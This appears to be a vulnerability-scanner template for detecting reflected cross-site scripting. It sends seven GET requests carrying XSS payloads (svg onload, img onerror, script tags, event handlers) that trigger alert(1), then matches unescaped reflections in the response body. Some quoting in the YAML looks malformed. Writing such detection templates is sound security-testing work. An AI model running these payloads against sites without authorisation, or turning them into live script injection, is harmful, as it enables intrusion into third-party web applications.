id: m7-xss-reflected-html
info:
  name: M7 - Reflected XSS in HTML Context
  author: Sharlix
  severity: high
  description: Context-aware reflected XSS detection in HTML body
  tags: xss,reflected,m7hunter
  reference:
    - https://portswigger.net/web-security/cross-site-scripting/reflected

requests:
  - method: GET
    path:
      - "{{BaseURL}}?q=m7xss1"><svg/onload=alert(1)>"
      - "{{BaseURL}}?search=m7xss2"><img src=x onerror=alert(1)>"
      - "{{BaseURL}}?input=m7xss3"><script>alert(1)</script>"
      - "{{BaseURL}}?name=m7xss4" autofocus onfocus=alert(1) x=""
      - "{{BaseURL}}?id=m7xss5</title><script>alert(1)</script>"
      - "{{BaseURL}}?s=m7xss6'><svg/onload=alert(1)>"
      - "{{BaseURL}}?t=m7xss7"><details/open/ontoggle=alert(1)>"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "<svg[^>]*(onload|onerror)=['"]?alert\(1\)"
          - "<img[^>]*onerror=['"]?alert\(1\)"
          - "<script>[^<]*alert\(1\)"
          - "autofocus[^>]*onfocus=['"]?alert\(1\)"
          - "<details[^>]*ontoggle=['"]?alert\(1\)"
        part: body
        condition: or

      - type: dsl
        dsl:
          - "!contains(body, '&lt;') && !contains(body, '&#x3c;')"
